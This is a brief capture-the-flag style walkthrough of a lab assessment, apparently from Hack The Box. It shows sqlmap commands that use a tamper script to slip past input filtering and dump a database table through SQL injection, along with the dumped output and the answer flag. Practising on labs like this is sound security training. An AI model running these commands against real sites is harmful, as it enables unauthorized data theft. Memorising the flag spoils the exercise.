# Skills Assessment

You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.

## Walkthrough

What's the contents of table final\_flag?

```bash
#catch http request from adding shoes into the cart
sqlmap -r req.txt --dump --batch --tamper=between -p 'id'
#for faster result
sqlmap -r req.txt --dump --batch --tamper=between -p 'id' --technique=T -T final_flag -D production --dbms=MySql
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
```
